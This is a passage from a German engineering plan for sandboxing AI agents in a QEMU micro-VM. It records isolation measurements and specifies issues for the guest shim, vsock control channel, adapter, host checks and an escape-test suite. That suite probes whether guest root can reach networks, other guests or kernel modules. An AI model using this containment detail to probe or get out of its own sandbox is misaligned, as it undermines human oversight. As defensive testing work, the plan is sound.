| Q5 | Inodes über virtiofs? | Gleich, für einen Eintrag (`pin`: 377185) wie für die Wurzel des Einhängens (`/work`: 376298 auf Host und Gast); Gerätenummer verschieden (43 Host, 28 oder 30 Gast, je nach Zahl der virtiofs-Einhängungen). Die Prüfung im Gast vergleicht also den Inode der Wurzel und den Typ `virtiofs` mit dem Tag, nicht die Gerätenummer des Hosts |
| Q6 | Kann Root im Gast nach dem Start Module laden? | Nein. `finit_module` mit `MODULE_INIT_COMPRESSED_FILE` lädt `vsock`, `vmw_vsock_virtio_transport_common`, `vmw_vsock_virtio_transport` als `.ko.xz` aus dem `/usr/lib/modules` des Hosts (`CONFIG_MODULE_DECOMPRESS=y`); danach `kernel.modules_disabled = 1`, ein weiteres `finit_module`: `Operation not permitted` |
| Q7 | Gehärtete transiente Unit? | Endform (Befehl unten): `systemd-run --user` mit `PrivateNetwork=yes`, `PrivateUsers=yes`, `NoNewPrivileges=yes`, `CapabilityBoundingSet=`, `ProtectSystem=strict`, `ProtectHome=read-only`, `RestrictAddressFamilies=AF_UNIX AF_NETLINK`, `LockPersonality`, `RestrictRealtime`, `SystemCallArchitectures=native`: alle Belege Q1 bis Q6 unverändert, `Finished with result: success`. bwrap läuft im Namensraum der Unit weiter. Alle vier Prozesse je in einem bwrap-Gefängnis; QEMU sieht aus `/boot` nur die Kernel-Datei |
| Q8 | Startzeit? | Endform ohne Konsole, drei Läufe: vom Aufruf von `systemd-run` bis zur ersten Verbindung des Gasts an der Tür 2,20 s, 2,24 s, 2,16 s; davon ab dem Start von QEMU 2,04 s, 2,03 s, 2,03 s (Debian-Generic-Kernel, SeaBIOS; Module laden, sperren und `/work` einhängen eingeschlossen). Zum Vergleich eine Unit derselben Art mit einem bwrap-Gefängnis, das `true` startet: 43 ms, 39 ms, 41 ms |
| Q9 | Erreicht ein Gast einen anderen Gast? | Zwei Gäste (CID 3 wählt, CID 4 lauscht auf Port 6000). Ein vhost-device-vsock-Prozess für beide, Gruppe `g1`: Verbindung kommt zustande (Positivkontrolle, `ACCEPTED a sibling connection`). Je Gast ein eigener Prozess, beide mit dem Gruppennamen `g1`: `errno=110 Connection timed out`, der Lauscher sieht nichts. Beide Fälle unter der Unit aus Q7 (`run-sib.sh`). Gruppen wirken nur innerhalb eines Prozesses; die Trennung trägt der eigene Prozess je Sitzung |
| Q10 | Steuerkanal vom Host in den Gast? | Endform: der Gast lauscht auf vsock-Port 6000; der Host verbindet sich mit `<uds>` und schreibt `CONNECT 6000`; Antwort `OK 6000`, danach Daten in beide Richtungen (`host-control` beim Gast, `guest-ack` beim Host). Der Gast selbst öffnet diesen Kanal nicht |
| Q11 | KVM und Pakete in der CI? | Weg festgelegt in HUM-465, belegt mit dem ersten grünen Lauf des Jobs `kvm-tests`: ein gehosteter Runner `ubuntu-24.04` ohne Container, `/dev/kvm` über eine udev-Regel freigegeben. Was Ubuntu 24.04 nicht oder zu alt liefert, kommt als Debian-Binärpaket mit fester sha256 und wird nur ausgepackt oder mit `dpkg -i` installiert, nie gebaut: `vhost-device-vsock` 0.3.0-2, `virtiofsd` 1.13.2 (Ubuntus 1.10 kennt `--readonly` nicht) und der Gastkernel aus Debians Cloud-Kernel 6.12 (der Kernel des Runners, `linux-azure`, hat `CONFIG_VIRTIO_FS=m` und bootet ohne initramfs keine virtiofs-Wurzel) |

Endform (Q7, Q8): ein Lauf mit allen Proben, als Root ohne Filter und ohne Konsole, unter der Unit aus Q7. `J` ist `bwrap --unshare-all --die-with-parent --new-session --cap-drop ALL --ro-bind /usr /usr --symlink usr/lib /lib --symlink usr/lib64 /lib64 --symlink usr/bin /bin --proc /proc --dev /dev`:

```
# Wurzel: der Socket kommt als Deskriptor 3, das Laufzeitverzeichnis ist im Gefängnis nicht sichtbar
J --tmpfs /tmp --dir /work --dir /sys --dir /run --ro-bind init /init \
  virtiofsd --shared-dir / --fd 3 --sandbox none --readonly
# /work: Ordner öffnen, dann den Pfad vertauschen, dann virtiofsd auf den Deskriptor
exec 7<project; mv project project-orig; mv project-new project
J --bind $R $R --bind-fd 7 /share virtiofsd --shared-dir /share --socket-path $R/work.sock --sandbox none
J --bind $R $R vhost-device-vsock --guest-cid 3 --socket $R/vsock.sock --uds-path $R/door --groups s<pid>
# Steuerkanal: der Host schreibt CONNECT 6000 an $R/door
J --bind $R $R --dev-bind /dev/kvm /dev/kvm --ro-bind /boot/vmlinuz-$(uname -r) /kernel \
  qemu-system-x86_64 ... -display none -serial none -monitor none -nic none -kernel /kernel ...
# alles in:
systemd-run --user --wait --pipe -p PrivateNetwork=yes -p PrivateUsers=yes -p NoNewPrivileges=yes \
  -p CapabilityBoundingSet= -p ProtectSystem=strict -p ProtectHome=read-only \
  -p RestrictAddressFamilies="AF_UNIX AF_NETLINK" -p LockPersonality=yes -p RestrictRealtime=yes \
  -p SystemCallArchitectures=native run-final.sh
```

Ausgabe (gekürzt um die Kopfzeilen von `systemd-run`):

```
HOST unit netns links: lo
HOST opened project: root ino=376298 pin ino=377185
HOST after swap, path now: root ino=384931 pin ino=384932
HOST qemu fds: 33×anon_inode:[eventfd] 2×anon_inode:[io_uring] 1×anon_inode:kvm-vcpu 1×anon_inode:kvm-vcpu-stats
  1×anon_inode:kvm-vm 1×anon_inode:[signalfd] 1×(deleted) 1×/dev/kvm 1×/dev/null 2×pipe: 5×socket:
GUEST modules load: 0 0 0
GUEST modules_disabled=1, later finit_module: Operation not permitted
GUEST netdevs: lo
GUEST inet 1.1.1.1:443: Network is unreachable
GUEST vsock 2:5001: Connection timed out
GUEST vsock 2:22: Connection timed out
GUEST vsock 1:5000: Connection timed out
GUEST vsock 4:5000: Connection timed out
GUEST vsock 3:5000: No such device
GUEST work mount=0 root ino=376298 pin ino=377185 pin content=pin
HOST control: OK 6000 / guest-ack
GUEST control from host: host-control
          Finished with result: success
```

Die zwei Pipes sind Standardausgabe und Standardfehler der Unit (`--pipe`), die fünf Sockets die vhost-user-Verbindungen der drei Geräte. Startzeit (Q8) aus drei Läufen derselben Endform ohne die Proben mit Timeout (`FAST=1`): erste Verbindung des Gasts an der Tür 2,20 s, 2,24 s, 2,16 s nach dem Aufruf von `systemd-run`, 2,04 s, 2,03 s, 2,03 s nach dem Start von QEMU.

Weitere Befunde:
- Das Laufzeitverzeichnis der Sitzung darf in der Wurzel des Gasts nicht stehen; der Socket des virtiofsd für die Wurzel kommt deshalb als Deskriptor (`--fd`), nicht als Pfad in dessen Gefängnis.
- Unix-Socket-Pfade sind auf 108 Byte begrenzt; das Laufzeitverzeichnis der Sitzung muss kurz sein (unter `$XDG_RUNTIME_DIR`, nicht unter einem Projekt- oder Temp-Pfad beliebiger Länge).
- Ein dynamisch gelinktes Programm aus einem OCI-Abbild läuft nur mit dessen glibc; die Wurzel aus dem Plan (Host-`/usr`) braucht kein initrd und keinen statischen Shim.
- Ubuntu installiert `/boot/vmlinuz-*` mit `0600`; dort fehlt die Stufe, bis der Nutzer `sandbox.qemu.kernel` setzt (HUM-464).
- Der Gast antwortet auf nicht vorhandene vsock-Ziele mit Timeout statt Ablehnung; das kostet nur Zeit, keine Garantie.

Entscheidung: [ADR-0021](../docs/adr/0021-qemu-microvm-kernel-level.md). Keine der drei Garantien kippt, unter der Bedingung aus Q9: je Sitzung ein eigener vhost-device-vsock-Prozess; die Kernel-Stufe geht weiter, neu geschnitten in HUM-464, HUM-465 und HUM-443 bis HUM-449.

## HUM-464 · Konfiguration und Port: Backend `qemu`, Gruppe `sandbox.qemu`, `krun` entfernt

### Kontext
ADR-0021 ersetzt die Laufzeit `krun` durch ein eigenes Backend. Zuerst kommen Schlüssel, Port und Diagnosen, ohne dass ein Start möglich ist.

### Spezifikation
1. `sandbox.backend` bekommt `qemu` (Stufe `kernel`), nur unter Linux auf x86-64; unter macOS lehnt es wie `bwrap` ab.
2. Neue Gruppe `sandbox.qemu` (`x-project-scope = "denied"`): `cpus` und `memory_mib` (Vorgaben wie `sandbox.podman`), `kernel` (Pfad eines Kernel-Abbilds, leer: `/boot/vmlinuz-$(uname -r)`), `modules` (Verzeichnis der Module dieses Kernels, leer: `/usr/lib/modules/<release>`), `start_timeout_secs`, und je Programm ein absoluter Pfad (`qemu`, `virtiofsd`, `vhost_device_vsock`; leer: Suche im `PATH`, `virtiofsd` zusätzlich `/usr/libexec/virtiofsd`).
3. `sandbox.podman.runtime` verliert `krun`; der Wert wird beim Laden mit einem `CONFIG`-Diagnostic abgelehnt, dessen `fix` `sandbox.backend = "qemu"` nennt. Proto, CLI (`--podman-runtime`) und App folgen.
4. Diagnosen: `SANDBOX_045` Voraussetzung der Kernel-Stufe fehlt (`/dev/kvm`, ein Programm oder eine Fähigkeit davon, geprüft an der Hilfe des Programms statt an einer Versionsnummer: virtiofsd `--readonly` und `--fd`, vhost-device-vsock `--uds-path` und `--groups`, QEMU `microvm` und `vhost-user-vsock-pci`, bwrap `--bind-fd`; Kernel-Abbild nicht lesbar, Modulverzeichnis fehlt), mit der fehlenden Voraussetzung in `why` und dem Paket in `fix`; `SANDBOX_046` Tür der Kernel-Stufe nicht aufgebaut; `SANDBOX_047` Host-Prüfung des VMM gescheitert. Registriert in `codes.rs` und `docs/DIAGNOSTICS.md`.
5. `qemu` steht in der Liste der Backends (`humanitl sandbox backends`, RPC) mit Stufe `kernel`, `available = false` und `SANDBOX_048` bis HUM-449, zusätzlich `SANDBOX_045` mit dem ersten Fehlenden.
6. `tools/coupling-baseline.toml` bekommt den Abschnitt `[qemu]` für `qemu`, `virtiofsd`, `vhost-device-vsock` und `microvm` außerhalb von `daemon/crates/sandbox/src/qemu/`; der Abschnitt `[podman]` sinkt um die `krun`-Stellen.

### Tests
- Unit Konfiguration: `qemu` mit `min_isolation = "kernel"` lädt; `podman` mit `min_isolation = "kernel"` scheitert mit `SANDBOX_035`; `runtime = "krun"` scheitert beim Laden mit dem neuen Code und dessen `fix`.
- Unit Backend-Liste: `qemu` ist `kernel`, nicht verfügbar, mit `SANDBOX_048`.
- Mutationsbeweis: `qemu` in `ADMITTED_BACKENDS` färbt den Test der Zulassung rot.

### Akzeptanzkriterien
1. Kein Weg startet `qemu` vor HUM-449, außer über `detect_unadmitted`.
2. Kein Schlüssel nennt `krun` mehr; ein alter Wert führt zu einem `Diagnostic` mit Weg.

### Fallstricke
- `sandbox.min_isolation = "kernel"` war bisher nur mit `podman` und `krun` erfüllbar; Tests und Texte, die das sagen, ziehen mit, auch die Tests aus HUM-448, die `runtime = "krun"` mit `SANDBOX_048` erwarten: sie erwarten danach das `CONFIG`-Diagnostic.

## HUM-465 · Shim im Gast: Module laden und sperren, Tür über vsock

### Kontext
Unter ADR-0021 ist der Shim PID 1 eines Gastkernels. Bevor er die Garantien prüft, muss er die vsock-Module laden, das Laden weiterer Module sperren und die Tür vom Gast-Loopback auf vsock abbilden.

### Spezifikation
1. Gast-Modus des Shims, gewählt über ein Argument im Plan, nie über die Umgebung des Agenten: `proc`, `sys`, `dev` einhängen; `vsock`, `vmw_vsock_virtio_transport_common`, `vmw_vsock_virtio_transport` aus dem Modulverzeichnis des Plans per `finit_module` mit `MODULE_INIT_COMPRESSED_FILE` laden (unkomprimierte Dateien ebenso); `kernel.modules_disabled = 1`; schlägt eins davon fehl, endet der Shim mit einer `CHECK`-Zeile und der Gast geht aus.
2. Der Shim lauscht auf `127.0.0.1:3128` und reicht jede Verbindung an CID 2, Tür-Port aus dem Plan weiter; Ende einer Seite schließt beide.
3. `/work` per virtiofs einhängen; die Mounttabelle mit dem Plan vergleichen wie HUM-437, mit dem Gast-Gerät des virtiofs-Einhängens statt der Gerätenummer des Hosts (Q5).
4. Filter: Der Shim selbst braucht nach dem Einsetzen seines Filters für jede Anfrage einen neuen `AF_VSOCK`-Socket. Im Gast-Modus erlaubt der Filter des Shims (heute die Brücke mit `AF_UNIX`) statt `AF_UNIX` die Familie `AF_VSOCK`; der Filter des Agenten verweigert `AF_VSOCK` und `AF_UNIX` außerhalb der Brücke weiter. Danach unverändert: `CHECK`-Zeilen, `exec` des Agenten.
5. Für Tests ohne den Adapter aus HUM-444 bekommt `daemon/crates/sandbox/src/qemu/` einen Startweg nur für Tests (Gast mit Shim als `init`, Wurzel aus einem festen Plan), und die CI einen Job `kvm-tests` auf einem gehosteten Linux-Runner mit `/dev/kvm` und den Debian-Paketen aus Q11. HUM-444 baut daraus den Adapter, HUM-445 die Escape-Suite im selben Job.

### Tests
- Unit: Aufbau der Modulpfade, Reihenfolge Laden vor Sperren, Abbruch bei Fehler.
- Integration unter KVM im Job `kvm-tests` (übersprungen ohne KVM, rot unter `STRICT=1` nur in diesem Job): Shim als `init`, Tür antwortet auf eine Anfrage, die nach dem Einsetzen des Filters gestellt wird, Modulsperre gesetzt, Agent ohne `AF_VSOCK`.
- Mutationsbeweis: Sperre entfernt färbt die Probe „Modul nach dem Start laden" rot; `AF_VSOCK` im Filter des Shims verboten färbt die Anfrage nach dem Filter rot.

### Akzeptanzkriterien
1. Nach dem Start des Agenten lädt kein Prozess im Gast ein Modul, auch nicht als Root.
2. Der Agent erreicht den Proxy nur über `127.0.0.1:3128` und den einen vsock-Port.

### Fallstricke
- Der Shim läuft als PID 1; endet er, gibt es eine Kernel-Panik und mit `-no-reboot` und `panic=-1` das Ende der VM. Das ist die Lebensleine im Gast, kein Fehler.

## HUM-443 · Shim: Steuerkanal als Strom, Terminal und weitere Shells im Gast

### Kontext
In einer VM überquert kein Deskriptor die Grenze: Das PTY kann nicht vom Daemon kommen, `SCM_RIGHTS` für weitere Shells (HUM-299) geht nicht, ein Host-Signal erreicht keinen Gastprozess. Der Shim braucht einen zweiten, erklärten Kanal, der als Strom läuft.

### Spezifikation
1. Ein gerahmtes Protokoll auf einem Strom-Socket (im Gast `AF_VSOCK`: der Daemon verbindet sich über das `CONNECT` von vhost-device-vsock mit dem Port, an dem der Shim lauscht, ADR-0021; in Tests ein Unix-Socket-Paar): Nachrichten für Terminal-Bytes je Kanal, Größe, Shell öffnen und schließen, Exit, Interrupt, Lebenszeichen; feste Höchstlängen, unbekannte Kennungen verworfen, wie die Tür heute.
2. Der Shim öffnet PTYs im Gast; die Seite des Daemons (`shell.rs`, `TerminalHub`) bekommt eine zweite Quelle neben dem Master-Deskriptor.
3. `EOF` auf dem Steuerkanal ist die Lebensleine der Kernel-Stufe.
4. Der seccomp-Filter des Agenten verweigert `AF_VSOCK` weiter; der Shim öffnet den Kanal vor dem Filter.
5. `docs/THREAT-MODEL.md`: K-Eintrag für den Steuerkanal (trägt keinen Netzverkehr, nur Terminal und Steuerung), K-18 um den Strom-Modus ergänzt; `docs/SECURITY.md` Abschnitt 4 „Further shells" beschreibt den Strom-Modus.

### Tests
- Shim-Unit: Protokoll mit Fuzz-Eingaben (übergroße Rahmen, unbekannte Kennungen) verwirft und bleibt stabil; `cargo fuzz`-Ziel für den Leser auf der Daemon-Seite.
- Integration unter bwrap mit dem Strom-Modus erzwungen: Terminal, Größe, zweite Shell, Detach und Attach wie mit dem Deskriptor-Modus.
- Mutationsbeweis: die Längenprüfung entfernt färbt den Fuzz-Regressionstest rot.

### Akzeptanzkriterien
1. Beide Modi (Deskriptor, Strom) bestehen dieselben Terminal-Tests.
2. Über den Steuerkanal geht kein Byte an den Proxy und keines von ihm; ESC-1 prüft im Strom-Modus, dass der Agent keinen `AF_VSOCK`-Socket öffnet.

### Fallstricke
- Der Shim läuft ohne tokio; PTYs, Steuerkanal und Lebenszeichen gehören in eine `poll`-Schleife statt in einen Faden je PTY, damit das Lesen der Rahmen an einer Stelle steht und geprüft werden kann.

## HUM-444 · QEMU-Adapter: Plan, Start in Gefängnissen, Ende, Host-Prüfung, doctor

### Kontext
ADR-0021: je Sitzung eine transiente Unit des Nutzers mit vier Prozessen in je einem bwrap-Gefängnis. Die Garantien müssen mit Root im Gast halten; die Prüfungen im Gast sind dann Tiefenverteidigung.

### Spezifikation
1. Adapter `daemon/crates/sandbox/src/qemu/` hinter `SandboxBackend`, `isolation()` ist `Kernel`. `detect` prüft jede Voraussetzung aus HUM-464 (`SANDBOX_045`).
2. Plan: die Wurzel des Gasts aus demselben Plan wie unter bwrap (Profil-Einhängungen, Shim, CA), gebaut als bwrap-Gefängnis, in dem virtiofsd `/` nur lesbar ausliefert; `/work` über einen zweiten virtiofsd mit dem geprüften Ordner per `--bind-fd`; vhost-device-vsock als eigener Prozess je Sitzung, nie für zwei Sitzungen geteilt (HUM-442, Q9), mit eigener Gruppe und `--uds-path` im Laufzeitverzeichnis der Sitzung, nie `--forward-cid`; der virtiofsd der Wurzel bekommt seinen Socket als Deskriptor (`--fd`), damit das Laufzeitverzeichnis nicht in der Wurzel des Gasts steht; QEMU sieht aus `/boot` nur die Kernel-Datei; QEMU mit der Startzeile aus HUM-442 ohne Konsole, Monitor und Anzeige, `-sandbox` voll, `/dev/kvm` als einziges Gerät, vCPU und Speicher aus `sandbox.qemu`. Der Daemon legt genau einen Lauscher `<uds>_<Tür-Port>` an, der an den Proxy-Socket der Sitzung reicht.
3. Start über den Dienstmanager des Nutzers (HUM-434) mit den Eigenschaften aus Q7; Ende: Unit stoppen, Laufzeitverzeichnis entfernen; ein Rest einer früheren Sitzung wird beim Start des Daemons entfernt (`SANDBOX_041`). Endet der Daemon, endet die Unit, ohne dass der Gast mitwirken muss: `BindsTo` auf die Unit des Daemons, außerhalb einer Unit eine Lebensleine auf dem Host (eine Pipe, deren Schreibende nur der Daemon hält; bei EOF stoppt der erste Prozess der Unit sie). Root im Gast kann das Ende des Steuerkanals übergehen; die Lebensleine im Gast ist nur Tiefenverteidigung.
4. `isolation_check` liest die `CHECK`-Zeilen aus dem Gast über den Steuerkanal (HUM-443); endet die VM ohne Bericht (etwa weil ein vsock-Modul nicht lädt), ist das eine gescheiterte Prüfung mit eigenem Grund, nie ein Erfolg. Dazu prüft der Daemon auf dem Host: Netz-Namensraum jedes Prozesses der Unit nur `lo`, Deskriptoren von QEMU nur die aus Q3 ohne Konsole, kein `/dev/vhost-vsock`, kein `tun`, im Laufzeitverzeichnis nur die erklärten Sockets, genau ein vhost-device-vsock-Prozess mit genau einem Gerät. Scheitert die Host-Prüfung: `SANDBOX_047`, Sitzung gestoppt.
5. `humanitl doctor` je Voraussetzung eine Zeile, Probestart der Stufe mit `DOCTOR_015` bei Fehlschlag.
6. `docs/SECURITY.md` neuer Abschnitt „Linux: QEMU micro-VM (kernel level)" mit den drei Garantien für die Stufe; `docs/THREAT-MODEL.md` K-Einträge für VMM, vsock-Tür, Gastkernel und die vier Hilfsprozesse.
7. Liest `sandbox.qemu.cpus`, `sandbox.qemu.memory_mib`, `sandbox.qemu.kernel`, `sandbox.qemu.modules`, `sandbox.qemu.start_timeout_secs`, `sandbox.qemu.qemu`, `sandbox.qemu.virtiofsd`, `sandbox.qemu.vhost_device_vsock`; `config_readers.rs` stuft sie danach als `effective` ein.

### Tests
- Unit: Startzeilen der vier Prozesse enthalten die festen Optionen; eine Verbotsliste prüft, dass keine Netzoption, kein `-netdev`, kein `-serial` außer `none`, kein `--forward-cid`, kein zweites `--vm` und kein zweiter Lauscher vorkommt.
- Integration: der Daemon wird mit `SIGKILL` beendet; die Unit der Sitzung ist binnen 5 s weg.
- Integration unter KVM im Job `kvm-tests` aus HUM-465: Sitzung startet über `detect_unadmitted`, Terminal funktioniert, Host-Prüfung grün.
- Mutationsbeweis: ein zusätzlicher Lauscher `<uds>_22` färbt die Host-Prüfung rot; ein `-nic user` färbt `no_interfaces` oder die Host-Prüfung rot.

### Akzeptanzkriterien
1. Die drei Garantien gelten mit Root im Gast (belegt in HUM-445).
2. Fehlt eine Voraussetzung, startet nichts, und das `Diagnostic` nennt sie; kein Rückfall auf ein anderes Backend.
3. Für Nutzer bleibt `qemu` mit `SANDBOX_048` gesperrt, bis HUM-449 landet.

### Fallstricke
- Vor der Modulsperre lädt der Gastkernel Module selbst nach (`/sbin/modprobe` aus dem Modulverzeichnis des Hosts, wenn die Release passt); der Shim setzt `kernel.modprobe` auf einen leeren Pfad, bevor er etwas einhängt, damit nur die Module des Plans geladen werden (HUM-465).
- Ein fest eingebautes Modul erscheint nur dann unter `/sys/module`, wenn es Parameter oder eine Version hat; der Shim scheitert dann geschlossen (HUM-465). Debian und Ubuntu bauen vsock als Modul; ein Kernel mit eingebautem vsock bekommt erst mit einem gemessenen Fall eine andere Prüfung.
- Ein Kernel mit `CONFIG_VIRTIO_FS=m` (Ubuntus `linux-azure` und vermutlich weitere Ubuntu-Kernel) bootet ohne initramfs keine virtiofs-Wurzel; `doctor` prüft `CONFIG_VIRTIO_FS=y` in der Konfiguration des Kernels (`/boot/config-*` oder `/proc/config.gz`) und nennt sonst `sandbox.qemu.kernel` (HUM-465).
- virtiofsd ab 1.11 kündigt Submounts an: die Einhängepunkte des Wurzel-Gefängnisses erscheinen im Gast erst beim Zugriff als eigene virtiofs-Einhängungen. Der Plan braucht eine feste Regel, entweder `--no-announce-submounts` oder die Einträge in der erwarteten Tabelle (HUM-465).
- Das `/proc` des virtiofsd-Gefängnisses ist in der Wurzel des Gasts sichtbar, bevor der Shim sein eigenes darüber hängt; geteilt wird besser ein Unterverzeichnis des Gefängnisses statt `/` (HUM-465).
- Die Probe `single_socket` läuft im Gast in ihr Eintragslimit (2000, `limit=entries`), weil die Wurzel das ganze Host-`/usr` ist; der Plan begrenzt die Suche auf die beschreibbaren Orte oder hebt das Limit für die Kernel-Stufe (HUM-465).
- Socket-Pfade höchstens 108 Byte (HUM-442): das Laufzeitverzeichnis liegt unter `$XDG_RUNTIME_DIR` und hat einen kurzen Namen.
- Ein Signal an QEMU beendet die VM, es unterbricht nicht den Agenten (Interrupt über HUM-443).

## HUM-445 · Escape-Suite der Kernel-Stufe: Proben mit Gast-Root, CI-Job mit KVM

### Kontext
Die Kernel-Stufe ist erst zulässig, wenn die ganze Suite gegen sie grün ist und Proben belegen, dass Root im Gast nichts außer der Tür erreicht.

### Spezifikation
1. `HUMANITL_ESCAPE_BACKEND=qemu` über `detect_unadmitted`; alle Proben laufen, auch die Mounttabellen-Probe aus HUM-437.
2. Neue Proben aus dem Gast als Root und ohne seccomp (nur im Testprofil, nie wählbar außerhalb der Suite): andere vsock-Ports und CIDs nicht erreichbar, auch nicht ein zweiter, lauschender Gast einer anderen Sitzung (Q9), nur `lo`, `connect` nach außen scheitert, `finit_module` scheitert; auf dem Host: Netz-Namensraum der Prozesse der Unit nur `lo`.
3. CI-Job `escape-tests-qemu`, aufgebaut auf `kvm-tests` aus HUM-465; Pfadregeln nach HUM-424.

### Tests
- Die Suite; Mutationsbeweise je neuer Probe (zusätzliches Netzgerät, zweiter Lauscher, Modulsperre aus), im Commit-Body mit Lauf-ID.

### Akzeptanzkriterien
1. `escape-tests-qemu` grün in der CI, keine Probe übersprungen, die bwrap grün hat. Bietet kein gehosteter Runner `/dev/kvm`, stoppt das Issue und geht mit Vorschlägen für einen Ersatz an den Inhaber; die Stufe bleibt bis dahin nicht zugelassen.
2. Das Testprofil ohne seccomp ist nur von der Suite ladbar (`SocketFloor`-Muster: Argument im Code, kein Schlüssel).

### Fallstricke
- Proben auf nicht vorhandene vsock-Ziele warten bis zum Timeout (HUM-442); die Probe setzt ein kurzes `SO_VM_SOCKETS_CONNECT_TIMEOUT`, damit der Job nicht wartet.

## HUM-446 · Kernel-Stufe: Projektordner und Wegwerf-Schicht über virtiofs

### Kontext
`/work` kommt über virtiofs in den Gast. Inodes reichen durch, Gerätenummern nicht (HUM-442, Q5). Die Wegwerf-Schicht braucht dieselbe Semantik wie HUM-350, mit dem Inhalt der Schicht als Daten des Angreifers.

### Spezifikation
1. Pinning: virtiofsd für `/work` bekommt den geprüften Ordner per `--bind-fd` (Q4); im Gast vergleicht der Shim den Inode des Einhängens mit dem Plan; auf dem Host prüft der Daemon, dass der virtiofsd-Prozess das geöffnete Verzeichnis hält.
2. Wegwerf: eine obere Schicht als eigenes Verzeichnis der Sitzung über einen dritten virtiofsd, im Gast ein overlay aus dem nur lesbaren `/work` und dieser Schicht (`overlay` vom Shim vor der Modulsperre geladen); der Daemon liest die Schicht erst nach dem Ende der VM, mit dem vorhandenen Scan; die Masken gelten wie überall.
3. `sandbox.mode`-Regeln aus HUM-357 unverändert (`SANDBOX_030`, `SANDBOX_033`).

### Tests
- Integration unter KVM: Tauschtest aus HUM-437 gegen `qemu`; ESC-5 Wegwerf-Lauf gegen `qemu`.
- Mutationsbeweis: Pfad statt `--bind-fd` färbt den Tauschtest rot.

### Akzeptanzkriterien
1. Kein Agent startet in einem nicht geprüften Ordner; ein Wegwerf-Lauf schreibt nie ins Projekt.
2. `docs/THREAT-MODEL.md` K-Eintrag für virtiofs.

### Fallstricke
- Mit Root im Gast ist jede Datei der Schicht vom Angreifer geschrieben, auch Whiteouts und Rechte; der Scan bleibt so streng wie unter bwrap.
- Bis zu diesem Issue prüft der ESC-5-Test `a_disposable_sandbox_never_writes_to_the_project` unter der Kernel-Stufe nur die Verweigerung (`SANDBOX_030`, HUM-445); dieses Issue macht daraus einen echten Wegwerf-Lauf.

## HUM-449 · Kernel-Stufe zulassen: `qemu` wird wählbar

### Kontext
Gegenstück zu HUM-448 für die Kernel-Stufe.

### Spezifikation
1. Voraussetzung, im Commit-Body mit Lauf-ID belegt: `escape-tests-qemu` grün auf `main` mit HUM-446 und den Proben mit Gast-Root aus HUM-445.
2. `ADMITTED_BACKENDS` bekommt `qemu`.
3. `docs/SECURITY.md` Abschnitt der Kernel-Stufe verliert den Hinweis „noch nicht zugelassen"; `docs/THREAT-MODEL.md` setzt die K-Einträge für VMM, vsock-Tür, Steuerkanal, Gastkernel und virtiofs auf `mitigated` mit ihren Proben.

### Tests
- Der Zulassungstest erwartet `qemu` in der Liste; `sandbox.min_isolation = "kernel"` mit `backend = "qemu"` startet (mit Attrappe).

### Akzeptanzkriterien
1. `humanitl run --backend qemu` startet eine Sitzung mit eigenem Kernel.
2. Der Commit ändert keine Zeile außerhalb der Zulassungsliste, ihrer Tests und der zwei Sicherheitsdokumente.

### Fallstricke
- Ohne die Pakete auf dem Rechner bleibt `qemu` mit `SANDBOX_045` nicht verfügbar; das ist kein Fehler der Zulassung.

## HUM-447 · Doku der Kernel-Stufe, Oberfläche schaltet `qemu` frei

### Kontext
Abschluss der Kernel-Stufe, nach der Zulassung (HUM-449).

### Spezifikation
1. `README.md` (en, de) nennt die Kernel-Stufe; `docs/CONFIG.md`, `docs/cli.md` (en, de), Installationsanleitung mit den Paketen; ADR-0021 Nachtrag „zugelassen" mit Lauf-ID, deutsch und englisch.
2. Oberfläche (HUM-440) zeigt `qemu` mit Stufe `kernel` und den Voraussetzungen aus dem RPC.
3. `.deb`: `qemu-system-x86`, `virtiofsd` und `vhost-device-vsock` nur unter `Suggests`; RPM und AUR entsprechend, soweit paketiert.

### Tests
- Widget: `qemu` wählbar nur mit `available = true`; Golden aktualisiert.
- `lint-docs.sh`, `check-doc-links.py`.

### Akzeptanzkriterien
1. Jede Aussage zur Kernel-Stufe ist durch `escape-tests-qemu` und `docs/SECURITY.md` gedeckt.

### Fallstricke
- Das Tor aus dem Kopf dieses Sprints gilt: `qemu` erscheint in der Oberfläche nicht vor HUM-449.

---

## HUM-450 · `humanitl sandbox argv` withholds hidden values in the CLI too

### Kontext
Beim Review von HUM-429 (2026-11-12) fiel auf: Die Vorschau im Daemon hält
Werte zurück, die der Nutzer verbirgt (`PlanPreview::withhold`), die CLI
`humanitl sandbox argv` druckt unter Linux dagegen die rohen `--setenv`-Werte
in Text und JSON, etwa `sandbox.env.HTTP_PROXY = "http://user:secret@host"`.
Das war schon vor HUM-429 so; die Ausgabe geht nur an den Nutzer selbst,
landet aber in Terminal-Verläufen und geteilten Fehlerberichten.

### Spezifikation
1. `humanitl sandbox argv` wendet dieselbe Entscheidung an wie die Vorschau
   im Daemon (eine Stelle, kein zweiter Filter), in Text und JSON.
2. Ein Schalter `--show-values` zeigt die Werte auf ausdrücklichen Wunsch.

### Tests
- CLI: ein verborgener Wert erscheint in Text und JSON als Platzhalter, mit
  `--show-values` im Klartext. Mutationsbeweis: ohne `withhold` rot.

### Akzeptanzkriterien
1. Kein verborgener Wert erscheint ohne `--show-values` in der Ausgabe.

### Fallstricke
- Der Platzhalter ist derselbe wie im Daemon (`WITHHELD_PLACEHOLDER`).

---

## HUM-451 · A daemon that stops reading the shell door delays neither the lifeline nor the agent

### Kontext
HUM-430 legt die Antworten des Shims an den Daemon (`R`, `E` je weiterer
Shell) in eine begrenzte Warteschlange, die die PID-1-Schleife bei `POLLOUT`
leert; läuft sie über oder ist der Daemon weg, beendet der Shim die
betroffenen Shells. Unit-Tests decken die Schlange ab, ein Integrationstest
mit einem echten Shell-Start fehlt, weil er in der Agent-Sandbox nicht lief
(Review HUM-430, 2026-11-12).

### Spezifikation
1. Ein Integrationstest startet die Sandbox, öffnet über die Tür weitere
   Shells und liest auf der Daemon-Seite nie, bis die Schlange überläuft.
2. Ein zweiter Fall schließt danach die Lebensleine.

### Tests
- Fall 1: die weiteren Shells sind beendet, der Agent läuft weiter.
- Fall 2: der Agent endet binnen `KILL_GRACE` plus 1 s.
- Mutationsbeweis: blockierendes `send` statt Warteschlange lässt Fall 2 rot
  werden.

### Akzeptanzkriterien
1. Beide Fälle laufen in der CI grün.

### Fallstricke
- Der Socket-Puffer muss wirklich voll sein; die Größe hängt am Kernel, also
  so lange öffnen, bis `EAGAIN` beobachtet ist, statt eine Zahl anzunehmen.

---

## HUM-452 · Podman: a container whose client ends unplanned is removed at once

### Kontext
HUM-433 schließt die Lebensleine, sobald `podman run` endet, und der Shim
beendet den Container binnen `KILL_GRACE`. Entfernt wird der beendete
Container aber erst durch ein späteres `kill` der Sitzung oder durch die
